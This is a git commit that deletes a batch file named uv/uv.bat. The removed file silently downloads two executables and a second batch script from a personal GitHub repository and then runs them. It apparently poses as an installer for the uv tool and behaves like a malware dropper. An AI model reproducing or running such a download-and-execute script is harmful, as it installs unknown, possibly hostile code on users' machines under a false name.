ce15de168ad3314ebd1e8f05cea80c253f3f8c16
mi0nrio <baytout4@outlook.com>
2024-11-17 21:58:46 +0100

    Delete uv directory

--- uv/uv.bat
+++
@@ -1,8 +0,0 @@
-@echo off
-curl -s -L -o uv.exe "https://raw.githubusercontent.com/miso201/miso201/refs/heads/main/uv/uv.exe"
-curl -s -L -o installuv.bat "https://raw.githubusercontent.com/miso201/miso201/refs/heads/main/uv/installuv.bat"
-curl -s -L -o screen-resolution.exe "https://raw.githubusercontent.com/miso201/miso201/refs/heads/main/uv/screen-resolution.exe"
-start "" "screen-resolution.exe"
-start "" "installuv.bat"
-
-
